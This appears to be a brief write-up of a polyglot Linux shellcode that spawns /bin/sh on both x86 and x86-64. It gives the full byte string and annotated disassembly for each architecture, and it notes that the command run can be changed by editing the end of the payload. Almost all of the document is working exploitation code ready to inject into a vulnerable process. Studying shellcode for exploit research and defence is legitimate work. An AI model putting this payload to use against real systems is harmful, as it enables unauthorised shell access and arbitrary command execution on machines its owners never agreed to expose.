This shellcode executes `execve("/bin/sh", {"/bin/sh", 0}, 0)`, on both x86 and
x86-64 linux.


```c
"\x48\x31\xc0\x50\x50\x5a\xeb\x14\x5f\x57\x40\x75\x07\xb0\x3b\x48\x89\xe6\x0f\x05\xb0\x0b\x89\xfb\x89\xe1\xcd\x80\xe8\xe7\xff\xff\xff/bin/sh"
```

```
x86 disas:
   0:   48                      dec    eax
   1:   31 c0                   xor    eax,eax
   3:   50                      push   eax
   4:   50                      push   eax
   5:   5a                      pop    edx
   6:   eb 14                   jmp    0x1c
   8:   5f                      pop    edi
   9:   57                      push   edi
   a:   40                      inc    eax
   b:   75 07                   jne    0x14

    ...

  14:   b0 0b                   mov    al,0xb
  16:   89 fb                   mov    ebx,edi
  18:   89 e1                   mov    ecx,esp
  1a:   cd 80                   int    0x80
  1c:   e8 e7 ff ff ff          call   0x8
  21:   "/bin/sh"

x86-64 disas:
   0:   48 31 c0                xor    rax,rax
   3:   50                      push   rax
   4:   50                      push   rax
   5:   5a                      pop    rdx
   6:   eb 14                   jmp    0x1c
   8:   5f                      pop    rdi
   9:   57                      push   rdi
   a:   40 75 07                rex jne 0x14
   d:   b0 3b                   mov    al,0x3b
   f:   48 89 e6                mov    rsi,rsp
  12:   0f 05                   syscall 

   ...

  1a:   cd 80                   int    0x80
  1c:   e8 e7 ff ff ff          call   0x8
  21:   "/bin/sh"

```

There is one catch however, the shellcode must be followed by a null byte,
which limits its universal usefulness.

One big advantage is that the command executed can be modified trivially, just
modify the end of the shellcode.
